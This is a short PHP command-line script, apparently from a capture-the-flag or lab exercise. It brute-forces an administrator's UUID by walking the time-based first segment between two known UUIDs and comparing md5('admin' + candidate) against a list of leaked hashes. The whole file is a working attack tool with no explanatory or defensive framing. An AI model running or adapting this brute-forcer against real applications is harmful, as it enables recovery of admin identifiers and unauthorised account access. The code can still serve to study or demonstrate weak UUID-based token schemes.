<?php

$uuid = $argv[1];
$admin_hash = $argv[2];
$uuid2 = $argv[3];

$admin_hashs = explode(",", $admin_hash);

$start = hexdec(substr($uuid, 0, 8));
$end = hexdec(substr($uuid2, 0, 8));
$uuid = substr($uuid, 9);
echo "Starting Brute Force... " . $start . " " . $uuid . "\n";
echo "Admin Hash: " . $admin_hash . "\n";

for ($i = $start; $i < $end; $i++) {
    $hash = md5("admin" . dechex($i) . "-" . $uuid);
    echo "Trying: " . dechex($i) . "-" . $uuid . " " . $hash . "\r";
    if (in_array($hash, $admin_hashs)) {
        echo "Admin UUID: " . dechex($i) . "-" . $uuid . "\n";
        break;
    }
}
?>